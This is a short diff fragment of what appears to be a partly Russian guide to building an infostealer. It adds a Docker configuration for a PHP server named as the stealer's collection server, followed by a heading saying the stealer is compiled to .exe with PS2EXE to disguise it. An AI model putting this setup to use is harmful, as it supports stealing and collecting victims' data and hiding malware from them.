@@ -841,6 +841,27 @@ foreach ($file in $files) {
 }
 ```
 
+docker-compose.yml
+
+```
+version: '3.8'
+services:
+  stiller:
+    image: php:8.1-apache
+    container_name: still3r_s3rv3r
+    volumes:
+      - ./html:/var/www/html
+    ports:
+      - "2222:80"
+```
+
+Dockerfile
+
+```
+FROM php:8.1-apache
+COPY . /var/www/html/
+RUN chown -R www-data:www-data /var/www/html
+```
 ⚙️ Подготовка исполняемого файла
 
 Для маскировки стиллер компилируется в .exe с помощью модуля PS2EXE:
